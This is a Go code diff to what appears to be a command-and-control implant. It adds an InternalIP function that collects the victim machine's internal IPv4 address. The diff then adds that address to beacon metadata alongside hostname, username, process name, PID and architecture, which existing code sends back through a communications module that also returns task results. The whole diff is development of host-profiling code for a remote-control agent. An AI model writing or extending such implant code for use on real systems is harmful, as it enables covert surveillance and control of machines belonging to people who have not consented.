@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"net"
 	"os"
 	"os/user"
 	"runtime"
@@ -77,6 +78,30 @@ func sendTaskResult(taskId string, result string) {
 	commModule.SendData(taskResult)
 }
 
+func InternalIP() (string, error) {
+	interfaces, err := net.Interfaces()
+	if err != nil {
+		return "", err
+	}
+
+	for _, iface := range interfaces {
+		addrs, err := iface.Addrs()
+		if err != nil {
+			return "", err
+		}
+
+		for _, addr := range addrs {
+			if ipNet, ok := addr.(*net.IPNet); ok && !ipNet.IP.IsLoopback() && !ipNet.IP.IsLinkLocalUnicast() {
+				if ipNet.IP.To4() != nil {
+					return ipNet.IP.String(), nil
+				}
+			}
+		}
+	}
+
+	return "", err
+}
+
 func generateMetadata() {
 	currentUser, err := user.Current()
 	if err != nil {
@@ -90,7 +115,10 @@ func generateMetadata() {
 		os.Exit(1)
 	}
 
-	integrity := "High"
+	ip, err := InternalIP()
+	if err != nil {
+		ip = "127.0.0.1"
+	}
 
 	architecture := "x86"
 	if runtime.GOARCH == "amd64" {
@@ -101,9 +129,9 @@ func generateMetadata() {
 		Id:           uuid.New().String(),
 		Hostname:     hostname,
 		Username:     currentUser.Username,
+		Ip:           ip,
 		ProcessName:  os.Args[0],
 		ProcessId:    os.Getpid(),
-		Integrity:    integrity,
 		Architecture: architecture,
 	}
 }
